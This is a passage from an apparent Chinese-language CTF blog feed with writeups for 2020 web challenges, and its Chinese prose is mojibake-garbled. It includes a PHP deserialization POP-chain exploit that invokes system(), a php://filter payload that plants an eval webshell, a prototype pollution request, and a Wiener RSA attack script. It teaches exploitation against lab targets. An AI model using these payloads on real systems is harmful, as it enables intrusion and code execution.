class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2) &#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;trick1 = <span class="string">"NaN"</span>;</span><br><span class="line">$a-&gt;trick2 = <span class="number">0</span> / <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<h1 id="0x05-littlegame"><a href="#0x05-littlegame" class="headerlink" title="0x05 littlegame"></a>0x05 littlegame</h1><p>ç»™äº†æºç ï¼Œå®¡è®¡æºç å¯ä»¥çœ‹åˆ°æœ‰å¦‚ä¸‹ä¸‰ä¸ªå…³é”®çš„è·¯ç”±</p>
<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200821142901154.png" alt="image-20200821142901154"></p>
<ul>
<li><p>/DeveloperControlPanel</p>
<p>å¦‚æœadminå¯¹åº”bodyä¼ çš„çš„keyç´¢å¼•å¯¹åº”çš„å€¼å’Œbodyä¼ çš„passwordç›¸ç­‰å°±å¯ä»¥å¾—åˆ°flagã€‚</p>
<img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/æ¯”èµ›202006/å›½èµ›/wp/image-20200821143105291.png" alt="image-20200821143105291" style="zoom:200%;">
</li>
<li><p>/Privilege</p>
<p>å¯¹bodyä¼ çš„NewAttributeKeyå’ŒNewAttributeValueä½œsetFnæ“ä½œï¼Œé€šè¿‡æœç´¢å¯ä»¥çŸ¥é“setFn<a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">æœ‰åŸå‹é“¾æ±¡æŸ“æ¼æ´</a><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200821143353995.png" alt="image-20200821143353995"></p>
</li>
</ul>
<p>è§£é¢˜æ­¥éª¤ï¼š</p>
<ol>
<li><pre><code>{&quot;NewAttributeKey&quot;:&quot;constructor.prototype.a1&quot;,&quot;NewAttributeValue&quot;:&quot;aaaaa&quot;}
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   ![image-20200821143857671](2020ciscn-webé¢˜ç›®writeup&#x2F;image-20200821143857671.png)</span><br><span class="line"></span><br><span class="line">2. &#96;&#96;&#96;json</span><br><span class="line">   &#123;&quot;key&quot;:&quot;a1&quot;,&quot;password&quot;:&quot;aaaaa&quot;&#125;</span><br></pre></td></tr></table></figure>

![image-20200821144013140](2020ciscn-webé¢˜ç›®writeup/image-20200821144013140.png)




</code></pre></li>
</ol>
<h1 id="0x06-bd"><a href="#0x06-bd" class="headerlink" title="0x06 bd"></a>0x06 bd</h1><blockquote>
<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200821144531943.png" alt="image-20200821144531943"></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    <span class="comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">c = <span class="number">37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line">e = <span class="number">46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line">n = <span class="number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br><span class="line">d = wiener_hack(e, n)</span><br><span class="line">print(d)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2020WMCTF-WEBé¢˜ç›®å¤ç°</title>
    <url>/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>WMCTFå‡ é“Webé¢˜ç›®å¤ç°</p>
<a id="more"></a>

<h1 id="0x01-checkin"><a href="#0x01-checkin" class="headerlink" title="0x01 checkin"></a>0x01 checkin</h1><p>é¦–å…ˆæ€»ç»“ä¸‹phpä¸­çš„<a href="https://www.php.net/manual/zh/filters.convert.php" target="_blank" rel="noopener">è¿‡æ»¤å™¨</a></p>
<ul>
<li>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</li>
</ul>
<p>php://filter/string.rot13</p>
<p>php://filter/string.toupper</p>
<p>php://filter/string.tolower</p>
<ul>
<li>string.strip_tags</li>
</ul>
<p>php://filter/string.strip_tags   å¯ä»¥å»æ‰<code>&lt;?php  xxxx?&gt;</code></p>
<ul>
<li>è½¬æ¢è¿‡æ»¤å™¨</li>
</ul>
<p>php://filter/convert.base64-decode</p>
<p>php://filter/convert.base64-encode</p>
<ul>
<li>å‹ç¼©è¿‡æ»¤å™¨</li>
</ul>
<p>php://filter/zlib.inflate/resource   è§£å‹</p>
<p>php://filter/zlib.deflate/resource  å‹ç¼©</p>
<p>php://filter/bzip2.compress/resource  å‹ç¼©</p>
<p>php://filter/bzip2.decompress/resource  è§£å‹</p>
<ul>
<li>åŠ å¯†è¿‡æ»¤å™¨</li>
</ul>
<p>php://filter/mcrypt.tripledes/resource=   åŠ å¯†</p>
<p>php://filter/mdecrypt.tripledes/resource=   è§£å¯†</p>
<h3 id="è§£æ³•ä¸€ï¼šåˆ©ç”¨urläºŒæ¬¡ç¼–ç "><a href="#è§£æ³•ä¸€ï¼šåˆ©ç”¨urläºŒæ¬¡ç¼–ç " class="headerlink" title="è§£æ³•ä¸€ï¼šåˆ©ç”¨urläºŒæ¬¡ç¼–ç "></a>è§£æ³•ä¸€ï¼šåˆ©ç”¨urläºŒæ¬¡ç¼–ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$char = <span class="string">'U'</span>; <span class="comment">#æ„é€ rçš„äºŒæ¬¡ç¼–ç  </span></span><br><span class="line"><span class="keyword">for</span> ($ascii1 = <span class="number">0</span>; $ascii1 &lt; <span class="number">256</span>; $ascii1++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($ascii2 = <span class="number">0</span>; $ascii2 &lt; <span class="number">256</span>; $ascii2++) &#123; </span><br><span class="line">        $aaa = <span class="string">'%'</span>.$ascii1.<span class="string">'%'</span>.$ascii2; </span><br><span class="line">        <span class="keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123; </span><br><span class="line">            <span class="keyword">echo</span> $char.<span class="string">': '</span>.$aaa; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\n"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>iâ€”â€”-%6%39   </p>
<p>Uâ€”â€“%5%35</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?&lt;hp%20pvela$(P_SO[T11)];%20&gt;?&#x2F;resource&#x3D;a.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808170056003.png" alt="image-20200808170056003"></p>
<p>åŒ…å«æ–‡ä»¶</p>
<p><img src="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808170121453.png" alt="image-20200808170121453"></p>
<h3 id="è§£æ³•äºŒï¼šåˆ©ç”¨ä¸´æ—¶æ–‡ä»¶åŒ…å«"><a href="#è§£æ³•äºŒï¼šåˆ©ç”¨ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="headerlink" title="è§£æ³•äºŒï¼šåˆ©ç”¨ä¸´æ—¶æ–‡ä»¶åŒ…å«"></a>è§£æ³•äºŒï¼šåˆ©ç”¨ä¸´æ—¶æ–‡ä»¶åŒ…å«</h3><blockquote>
<p><img src="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200814201554594.png" alt="image-20200814201554594"></p>
<p><a href="https://github.com/Mote-Z/PHP-Is-The-Best/tree/master/PHP_Tempfile_Exploit" target="_blank" rel="noopener">PHP-Is-The-Best</a></p>
</blockquote>
<p>æœ¬é¢˜phpç‰ˆæœ¬ä¸º7.0.33ï¼Œå¯ä»¥åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶åŒ…å«getshellã€‚</p>
<h1 id="0x02-webweb"><a href="#0x02-webweb" class="headerlink" title="0x02 webweb"></a>0x02 webweb</h1><p>trick1:å½“ä¸€ä¸ªæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºç±»å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸ºä¹‹å‰ç±»å¯¹è±¡çš„å‡½æ•°åï¼Œå¯ä»¥é€šè¿‡æ•°ç»„åè°ƒç”¨ä¹‹å‰ç±»çš„å¯¹åº”çš„æ–¹æ³•ï¼Œæºç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		system(<span class="string">"whoami"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$array = <span class="keyword">array</span>(<span class="keyword">new</span> A(), <span class="string">"foo"</span>);</span><br><span class="line">$array();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200814093944571.png" alt="image-20200814093944571"></p>
<p>trick2:æºç ä¸­çš„WS.phpé‡Œé¢åŒ…å«ä¸¤ä¸ªç±»ï¼Œåˆ†åˆ«æ˜¯WSç±»å’ŒAgentç±»ï¼Œæºç æ˜¯åˆ©ç”¨autoloadå‡½æ•°è‡ªåŠ¨åŠ è½½ç±»ï¼Œåœ¨newä¸€ä¸ªCLI\WSç±»æ—¶ä¼šé€šè¿‡autoload()å‡½æ•°åŒ…å«CLI/WS.phpï¼Œå¦‚æœnewä¸€ä¸ªCLI\Agentç±»æ—¶ï¼Œå› ä¸ºä¸å­˜åœ¨CLI/Agent.phpï¼Œæ‰€ä»¥æ–°å»ºCLI\Agentç±»ä¼šå¤±è´¥ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨é¦–å…ˆæ–°å»ºä¸€ä¸ªWSç±»ï¼Œå…ˆåŒ…å«CLI/WS.phpï¼Œç„¶åå°±å¯ä»¥æˆåŠŸæ–°å»ºAgentç±»ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">autoload</span><span class="params">($class)</span> </span>&#123;</span><br><span class="line">		$class=<span class="keyword">$this</span>-&gt;fixslashes(ltrim($class,<span class="string">'\\'</span>));</span><br><span class="line">		<span class="comment">/** <span class="doctag">@var</span> callable $func */</span></span><br><span class="line">		$func=<span class="keyword">NULL</span>;</span><br><span class="line">		<span class="keyword">if</span> (is_array($path=<span class="keyword">$this</span>-&gt;hive[<span class="string">'AUTOLOAD'</span>]) &amp;&amp;</span><br><span class="line">			<span class="keyword">isset</span>($path[<span class="number">1</span>]) &amp;&amp; is_callable($path[<span class="number">1</span>]))</span><br><span class="line">			<span class="keyword">list</span>($path,$func)=$path;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;split(<span class="keyword">$this</span>-&gt;hive[<span class="string">'PLUGINS'</span>].<span class="string">';'</span>.$path) <span class="keyword">as</span> $auto)</span><br><span class="line">			<span class="keyword">if</span> ($func &amp;&amp; is_file($file=$func($auto.$class).<span class="string">'.php'</span>) ||</span><br><span class="line">				is_file($file=$auto.$class.<span class="string">'.php'</span>) ||</span><br><span class="line">				is_file($file=$auto.strtolower($class).<span class="string">'.php'</span>) ||</span><br><span class="line">				is_file($file=strtolower($auto.$class).<span class="string">'.php'</span>))</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">require</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥é‡‡ç”¨ä¸¤ç§æ–¹å¼ï¼Œç¬¬ä¸€ç§å°†Agentç±»ä½œä¸ºWSç±»çš„ä¸€ä¸ªå±æ€§çš„å€¼ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šå…ˆåŠ è½½WSç±»ï¼Œä¹‹ååŒ…å«ws.php,ç„¶åå°±å¯ä»¥æˆåŠŸåŠ è½½Agentç±»å¯¹è±¡ï¼›ç¬¬äºŒç§æ–¹æ³•åºåˆ—åŒ–å¤„ç†ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºwsç±»å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸ºAgentå¯¹è±¡ï¼Œåœ¨ååºåˆ—åŒ–è¯¥æ•°ç»„åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ—¶é¦–å…ˆåŠ è½½WSç±»ï¼ŒåŒ…å«ws.php,ä¹‹åå°±å¯ä»¥æˆåŠŸåŠ è½½Agentå¯¹è±¡ã€‚</p>
<p>æ¥ä¸‹æ¥å¯»æ‰¾popé“¾</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Mapper</span> &#123;</span><br><span class="line">		<span class="title">protected</span></span><br><span class="line">		//! <span class="title">PDO</span> <span class="title">wrapper</span></span><br><span class="line">		$<span class="title">db</span>,</span><br><span class="line">		//! <span class="title">Database</span> <span class="title">engine</span></span><br><span class="line">		$<span class="title">engine</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">source</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span> (<span class="title">quoted</span>)</span><br><span class="line">		$<span class="title">table</span>,</span><br><span class="line">		//! <span class="title">Alias</span> <span class="title">for</span> <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">as</span>,</span><br><span class="line">		//! <span class="title">Last</span> <span class="title">insert</span> <span class="title">ID</span></span><br><span class="line">		$<span class="title">_id</span>,</span><br><span class="line">		//! <span class="title">Defined</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">fields</span>,</span><br><span class="line">		//! <span class="title">Adhoc</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">adhoc</span> = [],</span><br><span class="line">		//! <span class="title">Dynamic</span> <span class="title">properties</span></span><br><span class="line">		$<span class="title">props</span> = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;adhoc = <span class="keyword">array</span>(<span class="string">"whoami"</span> =&gt; [<span class="string">"expr"</span> =&gt; <span class="string">"test"</span>]);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;props[<span class="string">'quotekey'</span>] = <span class="string">"system"</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">DB</span>\<span class="title">SQL</span>\<span class="title">Mapper</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">		<span class="keyword">protected</span></span><br><span class="line">		$server,</span><br><span class="line">		$id,</span><br><span class="line">		$socket,</span><br><span class="line">		$flag,</span><br><span class="line">		$verb,</span><br><span class="line">		$uri,</span><br><span class="line">			$headers;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;server-&gt;events = <span class="keyword">array</span>(<span class="string">"disconnect"</span> =&gt; [<span class="keyword">new</span> Mapper(), <span class="string">"find"</span>]);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> $events = [];</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> Agent();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">CLI</span>\<span class="title">WS</span>;</span><br><span class="line"></span><br><span class="line">	print_r(serialize(<span class="keyword">new</span> WS()));</span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> WS()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Mapper</span> &#123;</span><br><span class="line">		<span class="title">protected</span></span><br><span class="line">		//! <span class="title">PDO</span> <span class="title">wrapper</span></span><br><span class="line">		$<span class="title">db</span>,</span><br><span class="line">		//! <span class="title">Database</span> <span class="title">engine</span></span><br><span class="line">		$<span class="title">engine</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">source</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span> (<span class="title">quoted</span>)</span><br><span class="line">		$<span class="title">table</span>,</span><br><span class="line">		//! <span class="title">Alias</span> <span class="title">for</span> <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">as</span>,</span><br><span class="line">		//! <span class="title">Last</span> <span class="title">insert</span> <span class="title">ID</span></span><br><span class="line">		$<span class="title">_id</span>,</span><br><span class="line">		//! <span class="title">Defined</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">fields</span>,</span><br><span class="line">		//! <span class="title">Adhoc</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">adhoc</span> = [],</span><br><span class="line">		//! <span class="title">Dynamic</span> <span class="title">properties</span></span><br><span class="line">		$<span class="title">props</span> = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;adhoc = <span class="keyword">array</span>(<span class="string">"whoami"</span> =&gt; [<span class="string">"expr"</span> =&gt; <span class="string">"test"</span>]);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;props[<span class="string">'quotekey'</span>] = <span class="string">"system"</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">DB</span>\<span class="title">SQL</span>\<span class="title">Mapper</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">		<span class="keyword">protected</span></span><br><span class="line">		$server,</span><br><span class="line">		$id,</span><br><span class="line">		$socket,</span><br><span class="line">		$flag,</span><br><span class="line">		$verb,</span><br><span class="line">		$uri,</span><br><span class="line">			$headers;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;server-&gt;events = <span class="keyword">array</span>(<span class="string">"disconnect"</span> =&gt; [<span class="keyword">new</span> Mapper(), <span class="string">"find"</span>]);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">CLI</span>\<span class="title">WS</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//print_r(serialize(new WS()));</span></span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="keyword">array</span>(<span class="keyword">new</span> WS(), <span class="keyword">new</span> CLI\Agent())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200814100410530.png" alt="image-20200814100410530"></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2020å¤©ç¿¼æ¯Webé¢˜ç›®å¤ç°</title>
    <url>/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>2020å¤©ç¿¼æ¯Webé¢˜ç›®å¤ç°</p>
<a id="more"></a>

<h1 id="0x01-API"><a href="#0x01-API" class="headerlink" title="0x01 API"></a>0x01 API</h1><p>é¦–å…ˆåœ¨æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œapp.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">"cors"</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="comment">//const uuidv4 = require("uuid/v4"); æœ¬åœ°å¤ç°æ—¶æœ€æ–°ç‰ˆæœ¬çš„uuidä¸æ”¯æŒè¿™ç§å†™æ³•</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">'uuid'</span>);</span><br><span class="line"><span class="keyword">const</span> md5 = <span class="built_in">require</span>(<span class="string">"md5"</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">"express-jwt"</span>);</span><br><span class="line"><span class="keyword">const</span> jsonwebtoken = <span class="built_in">require</span>(<span class="string">"jsonwebtoken"</span>);</span><br><span class="line"><span class="keyword">const</span> server = <span class="built_in">require</span>(<span class="string">"http"</span>).createServer(app);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; flag, secret, jwtSecret &#125; = <span class="built_in">require</span>(<span class="string">"./flag"</span>);</span><br><span class="line"><span class="comment">/*console.log(require("./flag"));</span></span><br><span class="line"><span class="comment">console.log(flag);</span></span><br><span class="line"><span class="comment">console.log(secret);</span></span><br><span class="line"><span class="comment">console.log(jwtSecret);*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  port: process.env.PORT || <span class="number">8081</span>,</span><br><span class="line">  adminValue: <span class="number">1000</span>,</span><br><span class="line">  message: <span class="string">"Can you get flag?"</span>,</span><br><span class="line">  secret: secret,</span><br><span class="line">  adminUsername: <span class="string">"kirakira_dokidoki"</span>,</span><br><span class="line">  whitelist: [<span class="string">"/"</span>, <span class="string">"/login"</span>, <span class="string">"/init"</span>, <span class="string">"/source"</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> users = &#123;</span><br><span class="line">  <span class="number">0</span>: &#123;</span><br><span class="line">    username: config.adminUsername,</span><br><span class="line">    isAdmin: <span class="literal">true</span>,</span><br><span class="line">    rights: <span class="built_in">Object</span>.keys(config)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line"></span><br><span class="line">app.use(cors());</span><br><span class="line"></span><br><span class="line">app.use(</span><br><span class="line">  jwt(&#123; <span class="attr">secret</span>: jwtSecret &#125;).unless(&#123;</span><br><span class="line">    path: config.whitelist</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">error, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (error.name === <span class="string">"UnauthorizedError"</span>) &#123;</span><br><span class="line">    res.json(err(<span class="string">"Invalid token or not logged in."</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sign</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> jsonwebtoken.sign(o, jwtSecret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ok</span>(<span class="params">data = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">"ok"</span>, <span class="attr">data</span>: data &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">err</span>(<span class="params">msg = <span class="string">"Something went wrong."</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">"error"</span>, <span class="attr">message</span>: msg &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidUser</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="number">6</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toLowerCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (u.username.toUpperCase() === config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() === config.adminUsername.toLowerCase()) || u.isAdmin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRights</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">"secret"</span>, <span class="string">"port"</span>];</span><br><span 